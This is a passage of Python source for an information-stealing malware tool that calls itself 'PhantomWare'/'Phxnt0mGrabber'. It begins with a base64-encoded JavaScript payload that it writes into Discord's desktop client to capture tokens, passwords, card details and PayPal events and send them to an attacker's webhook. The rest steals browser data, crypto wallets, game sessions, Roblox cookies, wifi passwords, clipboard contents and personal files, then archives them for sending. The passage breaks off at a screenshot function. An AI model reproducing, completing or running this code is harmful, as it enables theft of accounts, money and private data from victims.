hcn0qKmAsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZSwKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKkRpc2NvcmQgSW5mbyoqJywKICAgICAgICAgICAgdmFsdWU6IGBOaXRybyBUeXBlOiAqKiR7bml0cm99KipcbkJhZGdlczogKioke2JhZGdlc30qKlxuQmlsbGluZzogKioke2JpbGxpbmd9KipgLAogICAgICAgICAgICBpbmxpbmU6IHRydWUsCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAnKipUb2tlbioqJywKICAgICAgICAgICAgdmFsdWU6IGBcYCR7dG9rZW59XGBgLAogICAgICAgICAgICBpbmxpbmU6IGZhbHNlLAogICAgICAgICAgfSwKICAgICAgICBdLAogICAgICAgIGF1dGhvcjogewogICAgICAgICAgbmFtZToganNvbi51c2VybmFtZSArICcjJyArIGpzb24uZGlzY3JpbWluYXRvciArICcgfCAnICsganNvbi5pZCwKICAgICAgICAgIGljb25fdXJsOiBgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8ke2pzb24uaWR9LyR7anNvbi5hdmF0YXJ9LndlYnBgLAogICAgICAgIH0sCiAgICAgIH0sCiAgICBdLAogIH07CiAgaWYgKGNvbmZpZy5waW5nX29uX3J1bikgY29udGVudFsnY29udGVudCddID0gY29uZmlnLnBpbmdfdmFsOwogIGhvb2tlcihjb250ZW50KTsKfTsKCmNvbnN0IG5pdHJvQm91Z2h0ID0gYXN5bmMgKHRva2VuKSA9PiB7CiAgY29uc3QganNvbiA9IGF3YWl0IGdldEluZm8odG9rZW4pOwogIGNvbnN0IG5pdHJvID0gZ2V0Tml0cm8oanNvbi5wcmVtaXVtX3R5cGUpOwogIGNvbnN0IGJhZGdlcyA9IGdldEJhZGdlcyhqc29uLmZsYWdzKTsKICBjb25zdCBiaWxsaW5nID0gYXdhaXQgZ2V0QmlsbGluZyh0b2tlbik7CiAgY29uc3QgY29kZSA9IGF3YWl0IGJ1eU5pdHJvKHRva2VuKTsKICBjb25zdCBjb250ZW50ID0gewogICAgdXNlcm5hbWU6IGNvbmZpZy5lbWJlZF9uYW1lLAogICAgY29udGVudDogY29kZSwKICAgIGF2YXRhcl91cmw6IGNvbmZpZy5lbWJlZF9pY29uLAogICAgZW1iZWRzOiBbCiAgICAgIHsKICAgICAgICBjb2xvcjogY29uZmlnLmVtYmVkX2NvbG9yLAogICAgICAgIGZpZWxkczogWwogICAgICAgICAgewogICAgICAgICAgICBuYW1lOiAnKipOaXRybyBib3VnaHQhKionLAogICAgICAgICAgICB2YWx1ZTogYCoqTml0cm8gQ29kZToqKlxuXGBcYFxgZGlmZlxuKyAke2NvZGV9XGBcYFxgYCwKICAgICAgICAgICAgaW5saW5lOiB0cnVlLAogICAgICAgICAgfSwKICAgICAgICAgIHsKICAgICAgICAgICAgbmFtZTogJyoqRGlzY29yZCBJbmZvKionLAogICAgICAgICAgICB2YWx1ZTogYE5pdHJvIFR5cGU6ICoqJHtuaXRyb30qKlxuQmFkZ2VzOiAqKiR7YmFkZ2VzfSoqXG5CaWxsaW5nOiAqKiR7YmlsbGluZ30qKmAsCiAgICAgICAgICAgIGlubGluZTogdHJ1ZSwKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIG5hbWU6ICcqKlRva2VuKionLAogICAgICAgICAgICB2YWx1ZTogYFxgJHt0b2tlbn1cYGAsCiAgICAgICAgICAgIGlubGluZTogZmFsc2UsCiAgICAgICAgICB9LAogICAgICAgIF0sCiAgICAgICAgYXV0aG9yOiB7CiAgICAgICAgICBuYW1lOiBqc29uLnVzZXJuYW1lICsgJyMnICsganNvbi5kaXNjcmltaW5hdG9yICsgJyB8ICcgKyBqc29uLmlkLAogICAgICAgICAgaWNvbl91cmw6IGBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLyR7anNvbi5pZH0vJHtqc29uLmF2YXRhcn0ud2VicGAsCiAgICAgICAgfSwKICAgICAgfSwKICAgIF0sCiAgfTsKICBpZiAoY29uZmlnLnBpbmdfb25fcnVuKSBjb250ZW50Wydjb250ZW50J10gPSBjb25maWcucGluZ192YWwgKyBgXG4ke2NvZGV9YDsKICBob29rZXIoY29udGVudCk7Cn07CnNlc3Npb24uZGVmYXVsdFNlc3Npb24ud2ViUmVxdWVzdC5vbkJlZm9yZVJlcXVlc3QoY29uZmlnLmZpbHRlcjIsIChkZXRhaWxzLCBjYWxsYmFjaykgPT4gewogIGlmIChkZXRhaWxzLnVybC5zdGFydHNXaXRoKCd3c3M6Ly9yZW1vdGUtYXV0aC1nYXRld2F5JykpIHJldHVybiBjYWxsYmFjayh7IGNhbmNlbDogdHJ1ZSB9KTsKICB1cGRhdGVDaGVjaygpOwp9KTsKCnNlc3Npb24uZGVmYXVsdFNlc3Npb24ud2ViUmVxdWVzdC5vbkhlYWRlcnNSZWNlaXZlZCgoZGV0YWlscywgY2FsbGJhY2spID0+IHsKICBpZiAoZGV0YWlscy51cmwuc3RhcnRzV2l0aChjb25maWcud2ViaG9vaykpIHsKICAgIGlmIChkZXRhaWxzLnVybC5pbmNsdWRlcygnZGlzY29yZC5jb20nKSkgewogICAgICBjYWxsYmFjayh7CiAgICAgICAgcmVzcG9uc2VIZWFkZXJzOiBPYmplY3QuYXNzaWduKAogICAgICAgICAgewogICAgICAgICAgICAnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6ICcqJywKICAgICAgICAgIH0sCiAgICAgICAgICBkZXRhaWxzLnJlc3BvbnNlSGVhZGVycywKICAgICAgICApLAogICAgICB9KTsKICAgIH0gZWxzZSB7CiAgICAgIGNhbGxiYWNrKHsKICAgICAgICByZXNwb25zZUhlYWRlcnM6IE9iamVjdC5hc3NpZ24oCiAgICAgICAgICB7CiAgICAgICAgICAgICdDb250ZW50LVNlY3VyaXR5LVBvbGljeSc6IFsiZGVmYXVsdC1zcmMgJyonIiwgIkFjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMgJyonIiwgIkFjY2Vzcy1Db250cm9sLUFsbG93LU9yaWdpbiAnKiciXSwKICAgICAgICAgICAgJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOiAnKicsCiAgICAgICAgICAgICdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW4nOiAnKicsCiAgICAgICAgICB9LAogICAgICAgICAgZGV0YWlscy5yZXNwb25zZUhlYWRlcnMsCiAgICAgICAgKSwKICAgICAgfSk7CiAgICB9CiAgfSBlbHNlIHsKICAgIGRlbGV0ZSBkZXRhaWxzLnJlc3BvbnNlSGVhZGVyc1snY29udGVudC1zZWN1cml0eS1wb2xpY3knXTsKICAgIGRlbGV0ZSBkZXRhaWxzLnJlc3BvbnNlSGVhZGVyc1snY29udGVudC1zZWN1cml0eS1wb2xpY3ktcmVwb3J0LW9ubHknXTsKCiAgICBjYWxsYmFjayh7CiAgICAgIHJlc3BvbnNlSGVhZGVyczogewogICAgICAgIC4uLmRldGFpbHMucmVzcG9uc2VIZWFkZXJzLAogICAgICAgICdBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzJzogJyonLAogICAgICB9LAogICAgfSk7CiAgfQp9KTsKCnNlc3Npb24uZGVmYXVsdFNlc3Npb24ud2ViUmVxdWVzdC5vbkNvbXBsZXRlZChjb25maWcuZmlsdGVyLCBhc3luYyAoZGV0YWlscywgXykgPT4gewogIGlmIChkZXRhaWxzLnN0YXR1c0NvZGUgIT09IDIwMCAmJiBkZXRhaWxzLnN0YXR1c0NvZGUgIT09IDIwMikgcmV0dXJuOwogIGNvbnN0IHVucGFyc2VkX2RhdGEgPSBCdWZmZXIuZnJvbShkZXRhaWxzLnVwbG9hZERhdGFbMF0uYnl0ZXMpLnRvU3RyaW5nKCk7CiAgY29uc3QgZGF0YSA9IEpTT04ucGFyc2UodW5wYXJzZWRfZGF0YSk7CiAgY29uc3QgdG9rZW4gPSBhd2FpdCBleGVjU2NyaXB0KAogICAgYCh3ZWJwYWNrQ2h1bmtkaXNjb3JkX2FwcC5wdXNoKFtbJyddLHt9LGU9PnttPVtdO2ZvcihsZXQgYyBpbiBlLmMpbS5wdXNoKGUuY1tjXSl9XSksbSkuZmluZChtPT5tPy5leHBvcnRzPy5kZWZhdWx0Py5nZXRUb2tlbiE9PXZvaWQgMCkuZXhwb3J0cy5kZWZhdWx0LmdldFRva2VuKClgLAogICk7CiAgc3dpdGNoICh0cnVlKSB7CiAgICBjYXNlIGRldGFpbHMudXJsLmVuZHNXaXRoKCdsb2dpbicpOgogICAgICBsb2dpbihkYXRhLmxvZ2luLCBkYXRhLnBhc3N3b3JkLCB0b2tlbikuY2F0Y2goY29uc29sZS5lcnJvcik7CiAgICAgIGJyZWFrOwoKICAgIGNhc2UgZGV0YWlscy51cmwuZW5kc1dpdGgoJ3VzZXJzL0BtZScpICYmIGRldGFpbHMubWV0aG9kID09PSAnUEFUQ0gnOgogICAgICBpZiAoIWRhdGEucGFzc3dvcmQpIHJldHVybjsKICAgICAgaWYgKGRhdGEuZW1haWwpIHsKICAgICAgICBlbWFpbENoYW5nZWQoZGF0YS5lbWFpbCwgZGF0YS5wYXNzd29yZCwgdG9rZW4pLmNhdGNoKGNvbnNvbGUuZXJyb3IpOwogICAgICB9CiAgICAgIGlmIChkYXRhLm5ld19wYXNzd29yZCkgewogICAgICAgIHBhc3N3b3JkQ2hhbmdlZChkYXRhLnBhc3N3b3JkLCBkYXRhLm5ld19wYXNzd29yZCwgdG9rZW4pLmNhdGNoKGNvbnNvbGUuZXJyb3IpOwogICAgICB9CiAgICAgIGJyZWFrOwoKICAgIGNhc2UgZGV0YWlscy51cmwuZW5kc1dpdGgoJ3Rva2VucycpICYmIGRldGFpbHMubWV0aG9kID09PSAnUE9TVCc6CiAgICAgIGNvbnN0IGl0ZW0gPSBxdWVyeXN0cmluZy5wYXJzZSh1bnBhcnNlZERhdGEudG9TdHJpbmcoKSk7CiAgICAgIGNjQWRkZWQoaXRlbVsnY2FyZFtudW1iZXJdJ10sIGl0ZW1bJ2NhcmRbY3ZjXSddLCBpdGVtWydjYXJkW2V4cF9tb250aF0nXSwgaXRlbVsnY2FyZFtleHBfeWVhcl0nXSwgdG9rZW4pLmNhdGNoKGNvbnNvbGUuZXJyb3IpOwogICAgICBicmVhazsKCiAgICBjYXNlIGRldGFpbHMudXJsLmVuZHNXaXRoKCdwYXlwYWxfYWNjb3VudHMnKSAmJiBkZXRhaWxzLm1ldGhvZCA9PT0gJ1BPU1QnOgogICAgICBQYXlwYWxBZGRlZCh0b2tlbikuY2F0Y2goY29uc29sZS5lcnJvcik7CiAgICAgIGJyZWFrOwoKICAgIGNhc2UgZGV0YWlscy51cmwuZW5kc1dpdGgoJ2NvbmZpcm0nKSAmJiBkZXRhaWxzLm1ldGhvZCA9PT0gJ1BPU1QnOgogICAgICBpZiAoIWNvbmZpZy5hdXRvX2J1eV9uaXRybykgcmV0dXJuOwogICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICBuaXRyb0JvdWdodCh0b2tlbikuY2F0Y2goY29uc29sZS5lcnJvcik7CiAgICAgIH0sIDc1MDApOwogICAgICBicmVhazsKCiAgICBkZWZhdWx0OgogICAgICBicmVhazsKICB9Cn0pOwptb2R1bGUuZXhwb3J0cyA9IHJlcXVpcmUoJy4vY29yZS5hc2FyJyk7').decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode()))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class Phxnt0mGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    PasswordsCount: int = 0
    HistoryCount: int = 0
    RobloxCookiesCount: int = 0
    DiscordTokensCount: int = 0
    WifiPasswordsCount: int = 0
    MinecraftSessions: int = 0
    WebcamPicturesCount: int = 0
    TelegramSessionsCount: int = 0
    CommonFilesCount: int = 0
    WalletsCount: int = 0
    Screenshot: bool = False
    SystemInfo: bool = False
    SteamStolen: bool = False
    EpicStolen: bool = False
    UplayStolen: bool = False

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'PhantomWare'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        Logger.info('Creating temporary folder')
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        Logger.info('All functions ended')
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.GenerateTree()
        self.SendData()
        try:
            Logger.info('Removing archive')
            os.remove(self.ArchivePath)
            Logger.info('Removing temporary folder')
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealCommonFiles(self) -> None:
        if Settings.CaptureCommonFiles:
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Minecraft related files')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Epic session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                            self.EpicStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Steam session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPath = os.path.join('C:\\', 'Program Files (x86)', 'Steam')
            steamConfigPath = os.path.join(steamPath, 'config')
            if os.path.isdir(steamConfigPath):
                loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '"RememberPassword"\t\t"1"' in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok=True)
                            shutil.copytree(steamConfigPath, os.path.join(saveToPath, 'config'), dirs_exist_ok=True)
                            for item in os.listdir(steamPath):
                                if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                    shutil.copy(os.path.join(steamPath, item), os.path.join(saveToPath, item))
                                    self.SteamStolen = True
                        except Exception:
                            pass

    @Errors.Catch
    def StealUplay(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Uplay session')
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        if Settings.CaptureGames:
            Logger.info('Stealing Roblox cookies')
            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
            cookies = []
            browserCookies = '\n'.join(self.Cookies)
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                cookies.append(match)
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors='ignore'))
            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                cookies.append(match)
            cookies = [*set(cookies)]
            if cookies:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            Logger.info('Stealing crypto wallets')
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok=True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            for name, path in browserPaths.items():
                if os.path.isdir(path):
                    for root, dirs, _ in os.walk(path):
                        for _dir in dirs:
                            if _dir == 'Local Extension Settings':
                                localExtensionsSettingsDir = os.path.join(root, _dir)
                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                        try:
                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
                                            _saveToDir = os.path.join(metamask_browser, _dir)
                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                file.write(extentionPath)
                                            self.WalletsCount += 1
                                        except Exception:
                                            try:
                                                shutil.rmtree(_saveToDir)
                                                if not os.listdir(metamask_browser):
                                                    shutil.rmtree(metamask_browser)
                                            except Exception:
                                                pass

    @Errors.Catch
    def StealSystemInfo(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Stealing system information')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('systeminfo', capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                    file.write(output)
                self.SystemInfoCount = True

    @Errors.Catch
    def GetDirectoryTree(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting directory trees')
            PIPE = chr(9474) + '   '
            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
            output = {}
            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
                        if process.returncode == 0:
                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                    file.write(value)
                self.SystemInfo = True

    @Errors.Catch
    def GetClipboard(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting clipboard text')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
            if process.returncode == 0:
                content = process.stdout.decode(errors='ignore').strip()
                if content:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                        file.write(content)

    @Errors.Catch
    def GetAntivirus(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting antivirus')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write('\n'.join(output))

    @Errors.Catch
    def GetTaskList(self) -> None:
        if Settings.CaptureSystemInfo:
            Logger.info('Getting task list')
            saveToDir = os.path.join(self.TempFolder, 'System')
            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
            if process.returncode == 0:
                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                    tasklist.write(output)

    @Errors.Catch
    def GetWifiPasswords(self) -> None:
        if Settings.CaptureWifiPasswords:
            Logger.info('Getting wifi passwords')
            saveToDir = os.path.join(self.TempFolder, 'System')
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f'Network: {profile}\nPassword: {psw}')
            if profiles:
                os.makedirs(saveToDir, exist_ok=True)
                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)

    @Errors.Catch
    def TakeScreenshot(self) -> None:
        if Settings.CaptureScreenshot:
            Logger.info('Taking screenshot')
